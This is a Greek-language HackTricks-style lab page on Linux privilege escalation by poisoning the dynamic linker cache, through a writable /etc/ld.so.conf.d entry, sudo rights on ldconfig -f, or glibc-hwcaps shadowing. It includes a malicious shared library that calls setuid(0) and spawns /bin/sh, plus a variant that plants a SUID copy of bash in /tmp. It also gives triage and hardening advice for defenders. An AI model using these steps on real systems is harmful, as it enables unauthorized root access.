# παράδειγμα exploit privesc του ld.so

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα είναι ένα στοχευμένο lab για poisoning της **system linker cache μέσω των `/etc/ld.so.conf` ή `ldconfig`**. Για injection missing-library, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` και άλλες generic καταχρήσεις SUID linker, δείτε το [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Προετοιμασία του περιβάλλοντος

Στην ακόλουθη ενότητα μπορείτε να βρείτε τον κώδικα των αρχείων που θα χρησιμοποιήσουμε για την προετοιμασία του περιβάλλοντος.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Δημιούργησε** αυτά τα αρχεία στο μηχάνημά σου, στον ίδιο φάκελο
2. **Κάνε compile τη** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Αντέγραψε** το `libcustom.so` στο `/usr/lib` και κάνε refresh την cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Κάνε compile το** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Έλεγχος του περιβάλλοντος

Έλεγξε ότι το _libcustom.so_ γίνεται **load** από το _/usr/lib_ και ότι μπορείς να **εκτελέσεις** το binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Χρήσιμες εντολές triage

Κατά την επίθεση σε έναν πραγματικό στόχο, επαληθεύστε το **ακριβές όνομα της βιβλιοθήκης** που χρειάζεται το binary, τι **επιλύει επί του παρόντος ο loader** και ποιες διαμορφωμένες διαδρομές είναι εγγράψιμες χωρίς να τροποποιήσετε το ενεργό cache.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Χρησιμοποιήστε το `ldd` μόνο σε ένα **έμπιστο** εκτελέσιμο. Ορισμένες υλοποιήσεις ή ασυνήθιστοι ELF interpreters μπορεί να προκαλέσουν την εκτέλεση κώδικα που ελέγχεται από attacker· το `objdump -p ./file | grep NEEDED` εμφανίζει με ασφάλεια τις άμεσες εξαρτήσεις. Για έναν έμπιστο στόχο, η εκτέλεση του interpreter που εντοπίστηκε με την επιλογή `--list` εμφανίζει την πραγματική επίλυση.<sup>[[4]](#references)</sup>

Μερικά χρήσιμα gotchas:

- Το `sudo echo ... > /etc/ld.so.conf.d/x.conf` συνήθως **δεν λειτουργεί**, επειδή
η ανακατεύθυνση εκτελείται από το τρέχον shell. Χρησιμοποιήστε αντί γι' αυτό
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- Τα **SUID/privileged** binaries εκτελούνται σε **secure-execution mode**: το `LD_LIBRARY_PATH`
αγνοείται, ενώ το `LD_PRELOAD` περιορίζεται (ονόματα που περιέχουν κάθετο
αγνοούνται και είναι δυνατή η προφόρτωση μόνο βιβλιοθηκών με setuid flag σε τυπικούς καταλόγους). Μόλις ο root εκτελέσει το `ldconfig`, οι κατάλογοι που αναφέρονται στο
`/etc/ld.so.conf` μπορούν να καταχωριστούν στο `/etc/ld.so.cache`, επομένως αυτή η λανθασμένη ρύθμιση μπορεί
να εξακολουθεί να επηρεάζει privileged προγράμματα.<sup>[[1]](#references)[[2]](#references)</sup>
- Το `LD_DEBUG` επίσης αγνοείται σε secure-execution mode, εκτός αν υπάρχει το `/etc/suid-debug`, επομένως συλλέξτε το trace από μια αντίστοιχη non-SUID εκτέλεση αντί να περιμένετε έξοδο από την privileged εκτέλεση.<sup>[[1]](#references)</sup>
- Στα glibc 2.33 και νεότερα, ο dynamic loader παρέχει επίσης την επιλογή
`--list-diagnostics`, η οποία εμφανίζει machine-readable διαγνωστικά του loader και πληροφορίες για τα ενσωματωμένα search paths όταν ένα hijack δεν συμπεριφέρεται όπως αναμένεται.<sup>[[1]](#references)[[6]](#references)</sup>

### Περιορισμοί Cache και SONAME

Το `ldconfig` δεν αποθηκεύει στο cache κάθε αυθαίρετο αρχείο σε έναν ρυθμισμένο κατάλογο: εξετάζει ELF headers, αναγνωρίζει ονόματα που ταιριάζουν με `lib*.so*` ή `ld-*.so*` και αναμένει τη συμβατική ακολουθία `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Επομένως, το injected object πρέπει να έχει την αρχιτεκτονική/class του στόχου, το ακριβές όνομα `DT_NEEDED` (συνήθως το `DT_SONAME`) και τυχόν symbols/versions που επιλύει το victim.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Προτιμήστε μια βιβλιοθήκη ειδικά για τον στόχο, όπως σε αυτό το παράδειγμα. Η επισκίαση ενός κοινού SONAME με ένα ελλιπές object μπορεί να διακόψει κάθε διεργασία που το επιλύει πριν εκτελεστεί ο προβλεπόμενος privileged στόχος.<sup>[[3]](#references)</sup>

## Exploit

Σε αυτό το σενάριο, υποθέστε ότι ένας administrator έχει προσθέσει μια ευάλωτη καταχώριση σε ένα
file κάτω από το `/etc/ld.so.conf.d/`, το οποίο περιλαμβάνεται από το system's
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Ο ευάλωτος φάκελος είναι ο _/home/ubuntu/lib_ (όπου έχουμε πρόσβαση εγγραφής).\
**Κατεβάστε και κάντε compile** τον ακόλουθο κώδικα μέσα σε αυτήν τη διαδρομή:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Εάν αναμένετε ότι το **root** (ή ένας άλλος privileged λογαριασμός) θα εκτελέσει αργότερα το vulnerable binary, συνήθως είναι προτιμότερο να αφήσετε ένα **root-owned artifact** αντί να εκκινήσετε ένα interactive shell. Για παράδειγμα:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Στη συνέχεια, αφού πραγματοποιηθεί η εκτέλεση με προνόμια, μπορείτε να χρησιμοποιήσετε το `/tmp/rootbash -p`.

Τώρα που έχουμε **δημιουργήσει τη malicious libcustom library μέσα στη λανθασμένα ρυθμισμένη** διαδρομή, η προεπιλεγμένη cache πρέπει να αναδημιουργηθεί με μια επιτυχή εκτέλεση του **`ldconfig`** με προνόμια. Η επανεκκίνηση βοηθά μόνο όταν η τοπική διαδικασία εκκίνησης την εκτελεί πράγματι· διαφορετικά, περιμένετε ενέργεια από administrator ή χρησιμοποιήστε έναν unsafe sudo rule, αν υπάρχει διαθέσιμος.<sup>[[2]](#references)</sup>

Μόλις συμβεί αυτό, **ελέγξτε ξανά** από πού φορτώνει το executable `sharedvuln` τη βιβλιοθήκη `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Όπως μπορείτε να δείτε, το **φορτώνει από το `/home/ubuntu/lib`** και αν οποιοσδήποτε χρήστης το εκτελέσει, θα εκτελεστεί ένα shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Σημειώστε ότι σε αυτό το παράδειγμα δεν έχουμε κάνει privilege escalation, αλλά τροποποιώντας τις εντολές που εκτελούνται και **περιμένοντας από τον root ή άλλον privileged user να εκτελέσει το vulnerable binary**, θα μπορέσουμε να κάνουμε privilege escalation.

### Modern `glibc-hwcaps` shadowing

Από την glibc 2.33, ο loader μπορεί να προτιμά optimized libraries μέσα στο `glibc-hwcaps/<level>/`, σε **κάθε library search directory**. Επομένως, ο έλεγχος μόνο του `/home/ubuntu/lib` δεν επαρκεί: ένα writable compatible subdirectory, όπως το `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, μπορεί να κάνει shadow τη base library αφού το `ldconfig` την καταχωρίσει, ενώ άλλες CPUs συνεχίζουν να χρησιμοποιούν το base object. Αυτό παρέχει επίσης ένα architecture-selective hijack που μπορεί να μην εντοπιστεί όταν το validation πραγματοποιείται σε διαφορετική CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Η τρέχουσα guidance για το glibc hardening συνιστά την αποφυγή duplicate SONAMEs, non-default search locations και objects σε `glibc-hwcaps` subdirectories. Από την άποψη του audit, εφαρμόστε ownership και writeability checks αναδρομικά στους configured directories και σε όλα τα parent path components τους.<sup>[[3]](#references)</sup>

### Άλλες misconfigurations - Ίδιο vuln

Στο προηγούμενο παράδειγμα προσποιηθήκαμε μια misconfiguration όπου ένας administrator **όρισε έναν non-privileged φάκελο μέσα σε ένα configuration file μέσα στο `/etc/ld.so.conf.d/`**.\
Υπάρχουν όμως και άλλες misconfigurations που μπορούν να προκαλέσουν την ίδια vulnerability: αν έχετε **write permissions** σε ένα loaded **config file**, μπορείτε να δημιουργήσετε ένα αρχείο σε έναν writable `/etc/ld.so.conf.d/` directory ή μπορείτε να γράψετε στο `/etc/ld.so.conf`, μπορείτε να ρυθμίσετε και να κάνετε exploit την ίδια vulnerability.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Ας υποθέσουμε ότι έχετε sudo privileges πάνω στο `ldconfig`**.\
Μπορείτε να υποδείξετε στο `ldconfig` **ποιο configuration file να διαβάσει** με το `-f`, επομένως ένα αρχείο που περιέχει attacker-controlled directories μπορεί να κάνει το `ldconfig` να προσθέσει αυτούς τους φακέλους στο cache.<sup>[[2]](#references)</sup>\
Οπότε, ας δημιουργήσουμε τα αρχεία και τους φακέλους που απαιτούνται για να φορτωθεί το "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Τώρα, όπως υποδεικνύεται στο **previous exploit**, **δημιουργήστε τη malicious library μέσα στο `/tmp`**.\
Και τέλος, ας φορτώσουμε το path και ας ελέγξουμε από πού φορτώνει το binary τη library:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Όπως μπορείτε να δείτε, έχοντας sudo privileges για το `ldconfig`, μπορείτε να εκμεταλλευτείτε την ίδια ευπάθεια.** Οι λεπτομέρειες των options έχουν σημασία κατά την αξιολόγηση ενός περιορισμένου sudo rule: το `-f` επιλέγει άλλο configuration, αλλά εξακολουθεί να αναδημιουργεί το `/etc/ld.so.cache`; το `-C` ανακατευθύνει το cache αλλού· το `-N` αποτρέπει την αναδημιουργία του cache· και το `-X` αποτρέπει τις ενημερώσεις των links, αλλά **εξακολουθεί να αναδημιουργεί το cache, εκτός αν συνδυαστεί με το `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening του Dynamic Linker - Η GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnostics του Dynamic Linker (Η GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
